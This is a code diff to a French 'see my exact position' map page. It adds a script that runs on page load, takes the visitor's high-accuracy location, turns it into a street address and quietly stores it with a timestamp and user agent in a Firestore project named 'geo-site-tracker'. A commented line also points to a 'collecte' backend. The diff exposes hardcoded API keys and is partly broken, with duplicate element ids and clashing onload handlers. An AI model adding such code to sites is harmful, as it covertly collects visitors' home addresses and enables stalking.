@@ -10,15 +10,119 @@
     #status { margin-top: 1rem; font-weight: bold; }
   </style>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<!-- Firebase SDKs -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+  // 🔐 Ta configuration Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyCERRYunxY5FSS877mUdKHo6W1mRXIPjgM",
+    authDomain: "geo-site-tracker.firebaseapp.com",
+    projectId: "geo-site-tracker",
+    storageBucket: "geo-site-tracker.firebasestorage.app",
+    messagingSenderId: "837391043750",
+    appId: "1:837391043750:web:4a5eb441e598df0bfab867",
+    measurementId: "G-0WSGVT6HGT"
+  };
+
+  // ✅ Initialisation Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+
+  // 📍 Fonction pour enregistrer la position
+  async function enregistrerPosition(lat, lon, adresse) {
+    try {
+      await addDoc(collection(db, "positions"), {
+        latitude: lat,
+        longitude: lon,
+        adresse: adresse,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      });
+      console.log("📌 Position enregistrée avec succès !");
+    } catch (e) {
+      console.error("❌ Erreur Firestore :", e);
+    }
+  }
+
+  // 📡 Récupère la position géographique et adresse
+  async function getAdresseEtEnvoyer() {
+    if (!navigator.geolocation) {
+      alert("La géolocalisation n’est pas supportée.");
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(async (position) => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      const res = await fetch(`https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`);
+      const data = await res.json();
+      const adresse = data.features?.[0]?.properties?.formatted || "Adresse inconnue";
+
+      document.getElementById("adresse").innerText = `📍 ${adresse}`;
+
+      // 💾 Enregistrement dans Firestore
+      await enregistrerPosition(lat, lon, adresse);
+    },
+    () => alert("❌ Permission refusée ou erreur de géolocalisation."),
+    { enableHighAccuracy: true });
+  }
+
+  // ▶️ Démarre au chargement
+  window.onload = getAdresseEtEnvoyer;
+</script>
 </head>
 <body>
   <h1>Voir ma position exacte</h1>
   <button onclick="getLocation()">Voir ma position</button>
   <div id="status"></div>
   <div id="map"></div>
+  <p id="adresse">Recherche de votre adresse...</p>
+  <h2 id="adresse">📍 Recherche de votre position...</h2>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
+  // Fonction pour obtenir l’adresse exacte
+  function getAdresseExacte() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(async function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // Remplace ici par TA propre clé API Geoapify
+        const apiKey = "TA_CLE_API_ICI";
+
+        const url = `https://api.geoapify.com/v1/geocode/reverse?lat=${latitude}&lon=${longitude}&apiKey=${apiKey}`;
+
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.features && data.features.length > 0) {
+          const adresse = data.features[0].properties.formatted;
+          document.getElementById("adresse").innerText = "Votre adresse : " + adresse;
+
+          // Optionnel : envoyer vers ton backend
+          // fetch("https://mon-backend.com/collecte", { method: "POST", body: JSON.stringify({ adresse }) });
+
+        } else {
+          document.getElementById("adresse").innerText = "Impossible de déterminer l'adresse.";
+        }
+
+      }, function(error) {
+        alert("Permission refusée ou erreur de géolocalisation.");
+      }, { enableHighAccuracy: true });
+    } else {
+      alert("Géolocalisation non supportée.");
+    }
+  }
+
+  // Appel automatique au chargement de la page
+  window.onload = getAdresseExacte;
+</script><script>
     let map, marker;
 
     function getLocation() {
